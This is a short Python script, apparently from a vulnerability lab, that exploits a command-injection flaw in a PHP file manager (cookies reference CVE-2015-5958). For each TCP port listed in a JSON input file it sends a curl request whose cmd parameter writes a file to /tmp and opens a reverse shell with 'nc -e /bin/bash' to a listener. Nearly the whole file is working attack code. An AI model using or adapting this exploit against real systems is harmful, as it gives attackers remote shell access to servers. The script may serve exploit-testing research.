import sys, json, subprocess, os, shlex

TEMP="temp"
exploit = "/index.php?action=6&current_dir=.&cmd=echo TEMPORAL > /tmp/AAABBB;nc.traditional -e /bin/bash 127.0.0.1 10000 %26' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7' -H 'Cookie: expanded_dir_list=%3A%3Avar%3Awww%3ACVE-2015-5958; fm_current_root=%2Fvar%2Fwww%2FCVE-2015-5958%2F; resolveIDs=0; loggedon=d41d8cd98f00b204e9800998ecf8427e; order_dir_list_by=1A; leftFrameWidth=300' --compressed --insecure"

interface = sys.argv[1]
state = None
ip = None
ports = None

with open(interface, "r") as f:
    state = json.load(f)

ip = state["address"]
ports = state["ports"]

for e in ports:
    protocol = e[0]
    port = e[1]
    if protocol != "tcp":
        continue

    os.system("curl --max-time 2 'http://" + ip + ":" + port + exploit)
